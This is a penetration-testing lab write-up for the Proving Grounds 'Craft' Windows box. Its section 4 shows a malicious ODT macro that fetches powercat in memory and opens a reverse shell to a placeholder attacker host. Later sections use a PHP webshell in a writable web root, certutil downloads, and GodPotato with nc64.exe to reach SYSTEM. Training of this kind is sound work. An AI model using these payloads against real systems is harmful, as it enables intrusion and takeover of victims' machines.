
## Overview

**Platform:** OffSec Proving Grounds Practice **Operating System:** Windows (XAMPP stack) **Web Application:** Static company site with a résumé upload feature (ODT-only) **Initial Access:** Malicious LibreOffice macro embedded in an uploaded `.odt` "résumé," triggered server-side **Initial Access Type:** Malicious document upload → macro execution **Privilege Escalation:** Lateral move to the `apache` service account via a writable web root, then `SeImpersonatePrivilege` abuse via GodPotato **Final Access:** SYSTEM (or equivalent elevated context)

### Key Techniques

- Full TCP + UDP Nmap scan
- gobuster directory brute-forcing
- Manual site browsing for contact info / OSINT context
- Upload feature fingerprinting (ODT-only filter)
- LibreOffice macro creation and event-binding (`Open Document` trigger)
- Staged payload testing (harmless callback before a real shell)
- `powercat` in-memory PowerShell reverse shell
- Local enumeration habits (`whoami /priv`, `systeminfo`, directory review)
- winPEAS automated enumeration
- Identifying a writable web root as a lateral-movement primitive
- PHP webshell + full PHP reverse shell staging
- `SeImpersonatePrivilege` recognition
- GodPotato privilege escalation
- .NET Framework version check (tool compatibility)
- `certutil` for file transfer
- Payload testing in isolation before chaining through an exploit

---

# Attack Path

```text
nmap -p- (TCP) + UDP top-100
        ↓
Only Port 80 Open — Windows/Apache/PHP (XAMPP)
        ↓
gobuster: /uploads Directory Found
        ↓
Static Site — Résumé Upload Feature
        ↓
Upload Filter: ODT Files Only
        ↓
Malicious LibreOffice Macro (Shell() on Document-Open Event)
        ↓
Test Callback — Confirmed RCE
        ↓
Weaponize: powercat In-Memory Reverse Shell
        ↓
Shell as Low-Privileged User (document-processing context)
        ↓
Local Enumeration — whoami /priv, systeminfo, root directory review
        ↓
winPEAS — Flags Vulnerabilities, Logged-In apache User, SeImpersonatePrivilege Hint
        ↓
Discover Writable C:\xampp\htdocs (Web Root)
        ↓
Drop PHP Webshell — Confirm Apache Executes Uploaded PHP
        ↓
Drop Full PHP Reverse Shell
        ↓
Shell as apache Service Account (SeImpersonatePrivilege Present)
        ↓
Check .NET Framework Version
        ↓
Deliver GodPotato-NET4.exe via certutil
        ↓
Test GodPotato With whoami
        ↓
Test nc64.exe Standalone
        ↓
GodPotato + nc64.exe Combined Payload
        ↓
SYSTEM-Level Reverse Shell
```

---

# 1. Nmap Enumeration

```bash
sudo nmap -Pn -n $IP -sC -sV -p- --open
sudo nmap -Pn -n $IP -sU --top-ports=100
```

```text
80/tcp  http  Apache 2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7 — "Craft"
```

Only one port open — a Windows box running a XAMPP-style stack (Apache + PHP on Windows). Simplifies scope considerably: the web app is the entire attack surface.

---

# 2. Web Enumeration

```bash
sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:80 -t 42 -b 400,401,403,404
```

Browsing the site manually reveals a static company template with contact info (physical/email addresses) — noted for context, and the domain name added to `/etc/hosts` for consistency with any name-based routing.

**Most significant find: a résumé upload feature.** An `/uploads` directory also turns up in gobuster's results — a strong pairing (an upload feature + a corresponding public uploads directory) worth remembering as a recurring web app pattern.

> [!tip] Recognition Pattern A file-upload feature paired with a discoverable, web-accessible uploads directory is one of the highest-value combinations to find on any box — it means a successfully uploaded malicious file may be directly reachable and executable, not just stored.

---

# 3. Upload Filter Fingerprinting

Testing a dummy file upload returns an error: the app only accepts **ODT** (OpenDocument Text) files.

> [!tip] Key Decision Point At this point there's a genuine fork: try to bypass the extension/MIME-type filter to sneak a `.php` file through (using Burp to alter the request), or work _with_ the accepted format and weaponize it directly. ODT (like DOCX) supports embedded macros — the same class of attack used against Microsoft Office documents translates directly to LibreOffice/OpenDocument formats. Choosing to work within the accepted file type, rather than fighting the filter, is often the more reliable path when the accepted format itself supports active content.

---

# 4. Exploitation — Malicious ODT Macro

## Setup

```bash
sudo apt install libreoffice
```

Created a blank LibreOffice Writer document, then via **Tools → Macros → Organize Macros → Basic**, created a new macro attached to the document (named, e.g., "Evil"):

```basic
Shell("cmd /c powershell iwr http://<attacker_ip>/")
```

## Binding the macro to a trigger event

**Tools → Customize → Events tab**, selected the **"Open Document"** event, and assigned the macro to it — meaning the macro executes automatically whenever the document is opened (or, as it turns out, whenever the server-side processing pipeline touches the file, not necessarily requiring a human to double-click it).

Saved the macro, then the document.

## Testing with a harmless callback

```bash
sudo nc -lvnp 80
```

Uploaded the crafted `.odt` "résumé." After roughly 10 seconds, a connection landed on the listener — confirming the server processes uploaded ODT files in a way that **executes embedded macros**, likely via some automated document-preview or content-scanning step on the backend.

> [!tip] Key Principle Testing with a harmless callback (`iwr http://attacker/`) before committing to a real shell payload is a good habit here too — it confirms the macro executes and that the trigger event fires under real server conditions, without burning a listener setup on a payload that might not even be reached.

## Weaponizing — powercat reverse shell

Removed the test macro, replaced it with a two-stage in-memory PowerShell payload using **powercat** (a PowerShell-native alternative to netcat):

```basic
Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://<attacker_ip>/powercat.ps1');powercat -c <attacker_ip> -p 135 -e powershell")
```

- `IEX (New-Object System.Net.Webclient).DownloadString(...)` — downloads and executes `powercat.ps1` **entirely in memory**, never writing the script to disk.
- `powercat -c ... -p ... -e powershell` — once loaded, invokes powercat itself to open a reverse shell.

Re-assigned the macro to the same "Open Document" event, re-saved, hosted `powercat.ps1` via a local Python web server, and re-uploaded the revised document.

```bash
python -m http.server 80
```

Confirmed the first stage fired (server retrieved `powercat.ps1`), then checked the listener — reverse shell received.

> [!tip] Recognition Pattern Office-macro-based RCE isn't limited to Microsoft Office formats — any application ecosystem that supports embedded macros (LibreOffice/ODT included) and gets processed server-side (thumbnail generation, format conversion, virus/content scanning that opens the file) is a viable RCE vector once you can get a malicious file accepted by an upload filter. Worth trying whenever an upload feature restricts to a macro-capable document format.

---

# 5. Local Enumeration

Standard first checks after landing a shell: current user context, and a look at the filesystem root for anything non-default.

```text
Non-default items found: java, Windows10Upgrade, xampp, output.txt
```

## winPEAS

```powershell
iwr http://<attacker_ip>/winPEASany.exe -outfile winPEASany.exe
.\winPEASany.exe
```

Findings worth recording:

- OS version, processor count (relevant to potential race-condition exploits), architecture, installed hotfixes — flagged several known vulnerabilities (cross-referenced against Watson-style CVE matching).
- **Another logged-in user: `apache`** — since Apache runs as a service, this account likely carries **service-level privileges** (a strong hint toward `SeImpersonatePrivilege`).
- A generically-named service worth investigating for potential binary-replacement privesc if start/stop control were available.

> [!tip] Key Principle Before chasing every CVE winPEAS flags, finish a full pass of enumeration first — a logged-in service account (like `apache` here) is often a faster, more reliable escalation path than hunting down and weaponizing a specific kernel/software CVE, especially on a box that turns out to be built around impersonation-privilege abuse.

## Discovering a writable web root

Returning to inspect `xampp` more closely reveals **write access to `C:\xampp\htdocs`** — the actual document root Apache serves from.

> [!tip] Recognition Pattern A writable web root reachable from a low-privileged shell is a direct lateral-movement primitive: any file dropped there becomes both **disk-persistent** and **externally web-accessible**, meaning it can be triggered by browsing to it — executing in the context of whatever account runs the web server (here, `apache`), not the low-privileged account that wrote the file.

---

# 6. Lateral Movement — Webshell in the Writable Web Root

Confirmed PHP execution works by dropping a minimal webshell and browsing to it:

```text
Basic webshell dropped to C:\xampp\htdocs
Confirmed via browser that Apache executes it
```

With execution confirmed, dropped a **full PHP reverse shell** (a Windows-targeted one) into the same directory, hosted it locally, pulled it to the victim, set a listener, and browsed to trigger it.

```text
Browser hangs → check listener → shell received
```

New shell context: the **`apache`** service account.

```powershell
whoami /priv
```

Confirms **`SeImpersonatePrivilege`** is present — the setup that made `apache` the target lateral move in the first place.

---

# 7. Privilege Escalation — GodPotato

`SeImpersonatePrivilege` present on a service account is the textbook setup for a **Potato-family** privilege escalation (JuicyPotato, RoguePotato, GodPotato, PrintSpoofer, etc.) — these abuse the privilege's ability to impersonate a more privileged token obtained via a coerced local authentication, ultimately yielding SYSTEM.

- Tool: [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

## Checking .NET Framework compatibility

```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

GodPotato ships in multiple builds targeting different .NET Framework versions — checking this first avoids downloading/running a build that silently fails due to a framework mismatch.

## Delivery

```powershell
certutil -urlcache -split -f http://<attacker_ip>/GodPotato-NET4.exe
```

## Testing in isolation

```powershell
.\GodPotato-NET4.exe -cmd "whoami"
```

Confirms the exploit works before committing to a full reverse-shell chain.

## Building the final payload

Rather than assuming a complex payload will work first try, tested the reverse-shell component **standalone** before wrapping it in GodPotato:

```powershell
.\nc64.exe <attacker_ip> 80 -e c:\windows\system32\cmd.exe
```

Confirmed working, then combined:

```powershell
.\GodPotato-NET4.exe -cmd ".\nc64.exe <attacker_ip> 80 -e c:\windows\system32\cmd.exe"
```

Listener catches the connection — elevated shell obtained (SYSTEM-level, per GodPotato's mechanism, even though `whoami` output itself was inconsistent in the session — navigating directly to the flag confirmed success).

> [!tip] Key Principle When chaining privesc tools with a payload (GodPotato + netcat here), test **each component independently first** — the base exploit alone (`-cmd "whoami"`), then the payload alone (`nc64.exe` without GodPotato) — before combining them. This isolates failures to a specific stage rather than debugging a compound command blind.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Upload feature + discoverable public uploads directory|High-value combo — uploaded files may be directly reachable/executable|
|Upload filter restricts to a specific document format|Check whether that format supports macros (ODT, DOCX, XLSM, etc.) — work with the filter, not against it|
|Server-side document processing (preview, scan, convert) touches uploaded files|Macro-based RCE is viable even without a human opening the file|
|winPEAS/enumeration shows another logged-in service account|Consider it as a lateral-movement target before chasing CVE-based privesc|
|Low-privileged shell has write access to the web root|Direct lateral-movement primitive — drop and trigger a webshell to execute as the web service account|
|`whoami /priv` shows `SeImpersonatePrivilege`|Potato-family exploit (GodPotato, PrintSpoofer, etc.) is the standard path to SYSTEM|
|About to chain an exploit tool with a custom payload|Test the exploit alone and the payload alone before combining them|

---

# Key Lessons

> [!tip] Work With Upload Filters, Not Against Them, When the Accepted Format Supports Macros Rather than fighting a filter to sneak a `.php` file past validation, ODT (like DOCX/XLSM) supports embedded macros — a fully viable RCE vector once the file is accepted and processed server-side.

> [!tip] Test With a Harmless Callback Before Weaponizing Confirming a macro/payload fires with a simple `iwr` callback avoids wasting a real reverse-shell attempt on an untested trigger mechanism.

> [!tip] A Logged-In Service Account Is Often a Faster Path Than Chasing CVEs When enumeration reveals another active account tied to a service (here, `apache`), consider lateral movement toward it before investing time in kernel/software CVE hunting — service accounts often carry exploitable privileges like `SeImpersonatePrivilege` by design.

> [!tip] A Writable Web Root From Any Shell Is a Direct Privilege Lateral-Move Files dropped there execute in the web server's own context when triggered via browser — effectively "borrowing" whatever account runs the web service, independent of the shell's original privilege level.

> [!tip] `SeImpersonatePrivilege` → Potato-Family Exploit Is a Reliable, Repeatable Chain Once this privilege is confirmed via `whoami /priv`, GodPotato (or PrintSpoofer, RoguePotato depending on OS/patch level) is the standard, well-documented path to SYSTEM — check .NET Framework version compatibility before selecting a specific build.

> [!tip] Test Each Stage of a Chained Payload Independently Verify the exploit tool alone, then the payload alone, before combining them into a single command — isolates which part failed if the combined attempt doesn't work.